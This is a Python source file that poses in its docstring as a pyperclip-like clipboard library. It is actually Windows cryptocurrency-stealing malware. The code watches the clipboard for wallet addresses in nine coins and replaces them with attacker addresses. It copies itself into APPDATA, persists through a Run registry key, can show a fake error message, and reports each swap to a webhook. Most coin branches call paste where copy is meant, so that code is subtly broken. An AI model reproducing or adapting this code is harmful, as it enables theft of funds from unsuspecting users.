"""
essentailly the same as pyperclip but under different name
"""

import http.client
import clipboard
import socket
import ctypes
import winreg
import shutil
import json
import time
import sys
import re
import os

cwd = os.getcwd()

ignore = []

btcaddr = "SET BTC ADDRESS HERE"
ethaddr = "SET ETH ADDRESS HERE"
ltcaddr = "SET LTC ADDRESS HERE"
xmraddr = "SET XMR ADDRESS HERE"
soladdr = "SET SOL ADDRESS HERE"
dogeaddr = "SET DOGE ADDRESS HERE"
xrpaddr = "SET XRP ADDRESS HERE"
trxaddr = "SET TRX ADDRESS HERE"
bchaddr = "SET BCH ADDRESS HERE"

single_use = False
ping = False
incubate = False
false_error = False

webhook_url = ""

webhook_parts = webhook_url.replace("https://", "").split("/")
host = webhook_parts[0]
url_path = "/" + "/".join(webhook_parts[1:])

headers = {
    'Content-Type': 'application/json'
}

comp_name = socket.gethostname()

def is_crypto_addr(clipboard_text):
    try:
        btc_address_pattern = r"^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$"
        eth_address_pattern = r"^(0x)?[0-9a-fA-F]{40}$"
        ltc_address_pattern = r"^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$"
        xmr_address_pattern = r"^4[0-9AB][0-9a-zA-Z]{93}$"
        sol_address_pattern = r"^(?:[a-zA-Z0-9]){44}$"
        doge_address_pattern = r"^D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}$"
        xrp_address_pattern = r"^r[0-9a-zA-Z]{24,34}$"
        trx_address_pattern = r"^T[a-zA-Z0-9]{33}$"
        bch_address_pattern = r"^(bitcoincash:)?(q|p)[a-z0-9]{41}$"

        if re.match(btc_address_pattern, clipboard_text):
            return "BTC"
        elif re.match(eth_address_pattern, clipboard_text):
            return "ETH"
        elif re.match(ltc_address_pattern, clipboard_text):
            return "LTC"
        elif re.match(xmr_address_pattern, clipboard_text):
            return "XMR"
        elif re.match(sol_address_pattern, clipboard_text):
            return "SOL"
        elif re.match(doge_address_pattern, clipboard_text):
            return "DOGE"
        elif re.match(xrp_address_pattern, clipboard_text):
            return "XRP"
        elif re.match(trx_address_pattern, clipboard_text):
            return "TRX"
        elif re.match(bch_address_pattern, clipboard_text):
            return "BCH"
        else:
            return False
    except Exception:
        return False

def main():
    if false_error:
        if cwd != str(os.path.join(os.environ['APPDATA'], "CLPPTH")):
            ctypes.windll.user32.MessageBoxW(0, "An error has occurred!", "Error", 0x10)
    while True:
        try:
            clipboard_text = clipboard.paste()
            var = is_crypto_addr(clipboard_text)

            if var == "BTC":
                if btcaddr != "SET BTC ADDRESS HERE":
                    if clipboard_text != btcaddr:
                        clipboard.copy(btcaddr)
                        if single_use:
                                with open(os.path.join(os.environ['APPDATA'], 'Storage0', 'storage.txt'), "w") as o:
                                    o.write("True")
                                    o.close()
                                sys.exit()
                        if webhook_url != "":
                                if ping:
                                    message = {
                                    "content": f"@everyone```\ndetected BTC address on {comp_name} - changed to {btcaddr}\n```"
                                    }
                                else:
                                    message = {
                                        "content": f"```\ndetected BTC address on {comp_name} - changed to {btcaddr}\n```"
                                    }

                                json_data = json.dumps(message)

                                conn = http.client.HTTPSConnection(host)
                                conn.request("POST", url_path, json_data, headers)

                                response = conn.getresponse()

                                response.read()
                                conn.close()
            elif var == "ETH":
                if ethaddr != "SET ETH ADDRESS HERE":
                    if clipboard_text != ethaddr:
                        clipboard.paste(ethaddr)
                        if single_use:
                                with open(os.path.join(os.environ['APPDATA'], 'Storage0', 'storage.txt'), "w") as o:
                                    o.write("True")
                                    o.close()
                                sys.exit()
                        if webhook_url != "":
                                if ping:
                                    message = {
                                    "content": f"@everyone```\ndetected ETH address on {comp_name} - changed to {ethaddr}\n```"
                                    }
                                else:
                                    message = {
                                        "content": f"```\ndetected ETH address on {comp_name} - changed to {ethaddr}\n```"
                                    }

                                json_data = json.dumps(message)

                                conn = http.client.HTTPSConnection(host)
                                conn.request("POST", url_path, json_data, headers)

                                response = conn.getresponse()

                                response.read()
                                conn.close()
            elif var == "LTC":
                if ltcaddr != "SET LTC ADDRESS HERE":
                    if clipboard_text != ltcaddr:
                        clipboard.paste(ltcaddr)
                        if single_use:
                                with open(os.path.join(os.environ['APPDATA'], 'Storage0', 'storage.txt'), "w") as o:
                                    o.write("True")
                                    o.close()
                                sys.exit()
                        if webhook_url != "":
                                if ping:
                                    message = {
                                    "content": f"@everyone```\ndetected LTC address on {comp_name} - changed to {ltcaddr}\n```"
                                    }
                                else:
                                    message = {
                                        "content": f"```\ndetected LTC address on {comp_name} - changed to {ltcaddr}\n```"
                                    }

                                json_data = json.dumps(message)

                                conn = http.client.HTTPSConnection(host)
                                conn.request("POST", url_path, json_data, headers)

                                response = conn.getresponse()

                                response.read()
                                conn.close()
            elif var == "XMR":
                if xmraddr != "SET XMR ADDRESS HERE":
                    if clipboard_text != xmraddr:
                        clipboard.paste(xmraddr)
                        if single_use:
                                with open(os.path.join(os.environ['APPDATA'], 'Storage0', 'storage.txt'), "w") as o:
                                    o.write("True")
                                    o.close()
                                sys.exit()
                        if webhook_url != "":
                                if ping:
                                    message = {
                                    "content": f"@everyone```\ndetected XMR address on {comp_name} - changed to {xmraddr}\n```"
                                    }
                                else:
                                    message = {
                                        "content": f"```\ndetected XMR address on {comp_name} - changed to {xmraddr}\n```"
                                    }

                                json_data = json.dumps(message)

                                conn = http.client.HTTPSConnection(host)
                                conn.request("POST", url_path, json_data, headers)

                                response = conn.getresponse()

                                response.read()
                                conn.close()
            elif var == "SOL":
                if soladdr != "SET SOL ADDRESS HERE":
                    if clipboard_text != soladdr:
                        clipboard.paste(soladdr)
                        if single_use:
                                with open(os.path.join(os.environ['APPDATA'], 'Storage0', 'storage.txt'), "w") as o:
                                    o.write("True")
                                    o.close()
                                sys.exit()
                        if webhook_url != "":
                                if ping:
                                    message = {
                                    "content": f"@everyone```\ndetected SOL address on {comp_name} - changed to {soladdr}\n```"
                                    }
                                else:
                                    message = {
                                        "content": f"```\ndetected SOL address on {comp_name} - changed to {soladdr}\n```"
                                    }

                                json_data = json.dumps(message)

                                conn = http.client.HTTPSConnection(host)
                                conn.request("POST", url_path, json_data, headers)

                                response = conn.getresponse()

                                response.read()
                                conn.close()
            elif var == "DOGE":
                if dogeaddr != "SET DOGE ADDRESS HERE":
                    if clipboard_text != dogeaddr:
                        clipboard.paste(dogeaddr)
                        if single_use:
                                with open(os.path.join(os.environ['APPDATA'], 'Storage0', 'storage.txt'), "w") as o:
                                    o.write("True")
                                    o.close()
                                sys.exit()
                        if webhook_url != "":
                                if ping:
                                    message = {
                                    "content": f"@everyone```\ndetected DOGE address on {comp_name} - changed to {dogeaddr}\n```"
                                    }
                                else:
                                    message = {
                                        "content": f"```\ndetected DOGE address on {comp_name} - changed to {dogeaddr}\n```"
                                    }

                                json_data = json.dumps(message)

                                conn = http.client.HTTPSConnection(host)
                                conn.request("POST", url_path, json_data, headers)

                                response = conn.getresponse()

                                response.read()
                                conn.close()
            elif var == "XRP":
                if xrpaddr != "SET XRP ADDRESS HERE":
                    if clipboard_text != xrpaddr:
                        clipboard.paste(xrpaddr)
                        if single_use:
                                with open(os.path.join(os.environ['APPDATA'], 'Storage0', 'storage.txt'), "w") as o:
                                    o.write("True")
                                    o.close()
                                sys.exit()
                        if webhook_url != "":
                                if ping:
                                    message = {
                                    "content": f"@everyone```\ndetected XRP address on {comp_name} - changed to {xrpaddr}\n```"
                                    }
                                else:
                                    message = {
                                        "content": f"```\ndetected XRP address on {comp_name} - changed to {xrpaddr}\n```"
                                    }

                                json_data = json.dumps(message)

                                conn = http.client.HTTPSConnection(host)
                                conn.request("POST", url_path, json_data, headers)

                                response = conn.getresponse()

                                response.read()
                                conn.close()
            elif var == "TRX":
                if trxaddr != "SET TRX ADDRESS HERE":
                    if clipboard_text != trxaddr:
                        clipboard.paste(trxaddr)
                        if single_use:
                                with open(os.path.join(os.environ['APPDATA'], 'Storage0', 'storage.txt'), "w") as o:
                                    o.write("True")
                                    o.close()
                                sys.exit()
                        if webhook_url != "":
                                if ping:
                                    message = {
                                    "content": f"@everyone```\ndetected TRX address on {comp_name} - changed to {trxaddr}\n```"
                                    }
                                else:
                                    message = {
                                        "content": f"```\ndetected TRX address on {comp_name} - changed to {trxaddr}\n```"
                                    }

                                json_data = json.dumps(message)

                                conn = http.client.HTTPSConnection(host)
                                conn.request("POST", url_path, json_data, headers)

                                response = conn.getresponse()

                                response.read()
                                conn.close()
            elif var == "BCH":
                if bchaddr != "SET BCH ADDRESS HERE":
                    if clipboard_text != bchaddr:
                        clipboard.paste(bchaddr)
                        if single_use:
                                with open(os.path.join(os.environ['APPDATA'], 'Storage0', 'storage.txt'), "w") as o:
                                    o.write("True")
                                    o.close()
                                sys.exit()
                        if webhook_url != "":
                                if ping:
                                    message = {
                                    "content": f"@everyone```\ndetected BCH address on {comp_name} - changed to {bchaddr}\n```"
                                    }
                                else:
                                    message = {
                                        "content": f"```\ndetected BCH address on {comp_name} - changed to {bchaddr}\n```"
                                    }

                                json_data = json.dumps(message)

                                conn = http.client.HTTPSConnection(host)
                                conn.request("POST", url_path, json_data, headers)

                                response = conn.getresponse()

                                response.read()
                                conn.close()
            else:
                pass
        except Exception:
            pass
        time.sleep(0.10)

def dupe_self():
    try:
        current_script = os.path.abspath(sys.executable)
        appdata_path = os.environ['APPDATA']
        duplicate_directory = os.path.join(appdata_path, 'CLPPTH')
        os.makedirs(duplicate_directory, exist_ok=True)
        duplicate_script = os.path.join(duplicate_directory, "clppth.exe")
        shutil.copyfile(current_script, duplicate_script)
        return duplicate_script
    except Exception:
        return None

def add_reg(dupe_path):
    try:
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        key = winreg.HKEY_CURRENT_USER
        with winreg.OpenKey(key, key_path, 0, winreg.KEY_ALL_ACCESS) as reg_key:
            try:
                winreg.QueryValueEx(reg_key, "CLPPTH")
            except FileNotFoundError:
                winreg.SetValueEx(reg_key, "CLPPTH", 0, winreg.REG_SZ, dupe_path)
    except Exception:
        pass

def check():
    try:
        folder_name = "Storage0"
        appdata_path = os.environ['APPDATA']
        folder_path = os.path.join(appdata_path, folder_name)
        if not os.path.exists(os.path.join(folder_path, "storage.txt")):
            os.makedirs(folder_path, exist_ok=True)
            with open(os.path.join(folder_path, "storage.txt"), "w"):
                pass
            dupe_path = dupe_self()
            if dupe_path:
                add_reg(dupe_path)
                if incubate:
                    sys.exit()
                else:
                    main()
        else:
            with open(os.path.join(folder_path, "storage.txt"), "r") as o:
                ln1 = o.readline().strip('\n')
                if ln1 != "True":
                    if incubate:
                        if cwd == str(os.path.join(appdata_path, "CLPPTH")):
                            def check_incubate():
                                with open(os.path.join(cwd, "state.txt"), "r") as f:
                                    ln1 = f.readline().strip('\n')
                                    current_value = int(ln1)
                                if current_value != 2:
                                    new_value = current_value + 1
                                    with open(os.path.join(cwd, "state.txt"), "w") as f:
                                        f.write(str(new_value))
                                        sys.exit()
                                else:
                                    main()

                            def start_incubate():
                                dir = os.listdir(cwd)
                                if "state.txt" not in dir:
                                    with open(os.path.join(cwd, "state.txt"), "w") as f:
                                        f.write("0")
                                        sys.exit()
                                check_incubate()
                            start_incubate()
                    else:
                        main()
                else:
                    try:
                        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
                        key = winreg.HKEY_CURRENT_USER
                        with winreg.OpenKey(key, key_path, 0, winreg.KEY_ALL_ACCESS) as reg_key:
                            winreg.DeleteValue(reg_key, "CLPPTH")
                    except Exception:
                        pass
    except Exception:
        pass
    
if __name__ == "__main__":
    try:
        if os.name == "nt":
            if comp_name not in ignore:
                check()
    except Exception:
        pass
